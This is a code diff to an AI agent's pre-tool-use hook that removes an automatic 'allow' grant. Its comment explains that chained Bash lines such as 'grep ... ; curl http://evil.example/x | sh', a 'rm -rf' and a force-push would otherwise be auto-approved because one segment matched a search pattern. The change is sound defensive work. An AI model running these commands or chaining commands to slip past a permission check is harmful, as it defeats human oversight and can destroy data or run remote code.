@@ -14,8 +14,11 @@ Discipline (same fail-safe posture as post_tool_use / session_start):
 
 Protocol shape (confirmed: PreToolUse honors additionalContext without blocking):
   {"hookSpecificOutput": {"hookEventName": "PreToolUse",
-                          "permissionDecision": "allow",
                           "additionalContext": "..."}}
+
+NOTE the absence of `permissionDecision`. This rail matches Bash, so a grant would
+cover the entire command line rather than the segment it recognised — see the
+comment at the emit site (#596 r7).
 """
 
 from __future__ import annotations
@@ -773,7 +776,22 @@ def main() -> None:
         sys.exit(0)
 
     # ------------------------------------------------------------------
-    # Emit the protocol JSON (allow + additionalContext) and exit 0.
+    # Emit the protocol JSON (additionalContext ONLY) and exit 0.
+    #
+    # NO `permissionDecision` — AND ITS ABSENCE IS THE SECURITY PROPERTY (#596 r7,
+    # Critical). This hook emitted `"permissionDecision": "allow"` unconditionally,
+    # which dates from #208 when the matcher was `Grep` alone: auto-approving a
+    # read-only Grep is nearly harmless. THIS PR WIDENED THE MATCHER TO
+    # `Grep|Bash`, and an `allow` on a Bash call grants THE WHOLE COMMAND LINE —
+    # while `_bash_search_pattern` only has to like ONE SEGMENT of it. Measured:
+    #
+    #   grep my_symbol src && rm -rf /tmp/something          -> pattern found
+    #   grep my_symbol src; curl http://evil.example/x | sh  -> pattern found
+    #   rg my_symbol src && git push --force origin main     -> pattern found
+    #
+    # A context-augmentation rail must never be a permission oracle. It has no
+    # opinion about whether the command should run; it only has symbols to add.
+    # `post_tool_use.py` already ships exactly this shape.
     # ------------------------------------------------------------------
     try:
         context = _build_context(pattern, results)
@@ -782,7 +800,6 @@ def main() -> None:
                 {
                     "hookSpecificOutput": {
                         "hookEventName": "PreToolUse",
-                        "permissionDecision": "allow",
                         "additionalContext": context,
                     }
                 }
